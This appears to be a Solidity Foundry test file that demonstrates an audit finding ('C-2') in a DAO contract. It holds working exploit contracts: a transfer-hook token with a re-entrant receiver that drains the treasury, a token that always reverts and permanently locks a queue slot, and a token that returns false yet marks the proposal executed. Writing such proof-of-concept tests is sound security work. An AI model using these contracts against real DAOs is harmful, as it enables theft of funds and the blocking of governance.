// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {VotingDAOV2} from "contracts/VotingDAOV2.sol";
import {Errors} from "contracts/Errors.sol";

import {DAOTestBase} from "./Base.t.sol";

interface ITokenReceiver {
    function onTokenReceived(address from, uint256 amount) external;
}

/// @notice ERC-20 with an ERC-777-style transfer hook: recipients that opted in are called after each transfer.
contract CallbackToken is ERC20 {
    mapping(address => bool) public hookRegistered;

    constructor(address holder, uint256 supply) ERC20("Callback Token", "CBT") {
        _mint(holder, supply);
    }

    function registerHook() external {
        hookRegistered[msg.sender] = true;
    }

    function _afterTokenTransfer(address from, address to, uint256 amount) internal override {
        if (hookRegistered[to]) ITokenReceiver(to).onTokenReceived(from, amount);
    }
}

/// @notice Re-enters `execute` from the token hook while the treasury can pay again.
contract ReentrantTokenReceiver is ITokenReceiver {
    VotingDAOV2 private immutable dao;
    IERC20 private immutable token;
    uint256 private immutable hash;
    uint256 private immutable amount;

    constructor(VotingDAOV2 dao_, CallbackToken token_, uint256 hash_, uint256 amount_) {
        dao = dao_;
        token = token_;
        hash = hash_;
        amount = amount_;
        token_.registerHook();
    }

    function onTokenReceived(address, uint256) external {
        if (token.balanceOf(address(dao)) >= amount) dao.execute(hash);
    }
}

/// @notice Passes the treasury balance check, then always reverts on transfer.
contract RevertingToken {
    function balanceOf(address) external pure returns (uint256) {
        return type(uint256).max;
    }

    function transfer(address, uint256) external pure returns (bool) {
        revert("TRANSFER_BLOCKED");
    }
}

/// @notice Passes the treasury balance check, then moves nothing and returns false.
contract FalseReturningToken {
    function balanceOf(address) external pure returns (uint256) {
        return type(uint256).max;
    }

    function transfer(address, uint256) external pure returns (bool) {
        return false;
    }
}

/// @title C-2. Poisoned or non-ERC-20-compatible payment token
/// @notice Any address can be used as the payment token of a proposal, `execute` calls it before
/// it sets `proposal.isExecuted`, and the return value of `transfer` is ignored.
contract C2_PoisonedPaymentToken is DAOTestBase {
    uint256 internal constant HASH = 1;

    event ProposalExecuted(uint256 indexed hash);

    /// A token that calls the recipient on transfer lets it re-enter `execute`
    /// and take the whole treasury balance of that token.
    function test_C2_CallbackTokenReentrancyDrainsTreasury() public {
        uint256 treasury = 1_000e18;
        uint256 payout = 100e18;
        CallbackToken token = new CallbackToken(address(dao), treasury);
        ReentrantTokenReceiver recipient = new ReentrantTokenReceiver(dao, token, HASH, payout);

        vm.prank(attacker);
        dao.withdrawToken(HASH, address(token), address(recipient), payout);
        _accept(HASH);

        dao.execute(HASH);

        assertEq(token.balanceOf(address(recipient)), treasury, "recipient received the whole treasury");
        assertEq(token.balanceOf(address(dao)), 0, "treasury is empty");
    }

    /// A token that always reverts makes an accepted proposal impossible to execute.
    /// `isActive` ignores expiry, so the proposal holds its queue slot forever.
    function test_C2_RevertingTokenLocksQueueSlot() public {
        RevertingToken token = new RevertingToken();

        vm.prank(attacker);
        dao.withdrawToken(HASH, address(token), attacker, 1);
        _accept(HASH);

        vm.expectRevert(bytes("TRANSFER_BLOCKED"));
        dao.execute(HASH);

        // The other 9 slots are used by proposals that get rejected, so they become reusable.
        for (uint256 i = 1; i < MAX_ACTIVE_PROPOSALS; ++i) {
            _createProposal(bob, 100 + i);
            _reject(100 + i);
        }

        // Long after the poisoned proposal has expired, it still cannot be executed or removed.
        vm.warp(block.timestamp + 365 days);
        vm.expectRevert(bytes(Errors.ERROR_EXPIRED));
        dao.execute(HASH);

        // Only 9 new proposals fit into the queue: the poisoned one is never replaced.
        for (uint256 i = 1; i < MAX_ACTIVE_PROPOSALS; ++i) {
            _createProposal(bob, 200 + i);
        }
        _expectQueueIsFull(bob, 300);

        (bool found,) = dao.find(HASH);
        assertTrue(found, "poisoned proposal is still in the queue");
    }

    /// A token that returns false without moving funds still marks the proposal as executed.
    function test_C2_FalseReturningTokenMarksProposalExecuted() public {
        FalseReturningToken token = new FalseReturningToken();
        address recipient = makeAddr("recipient");

        vm.prank(attacker);
        dao.withdrawToken(HASH, address(token), recipient, 1_000e18);
        _accept(HASH);

        vm.expectEmit(true, false, false, false, address(dao));
        emit ProposalExecuted(HASH);
        dao.execute(HASH);

        // Nothing was paid, but the proposal can never be executed again.
        vm.expectRevert(bytes(Errors.ERROR_ALREADY_EXECUTED));
        dao.execute(HASH);
    }
}
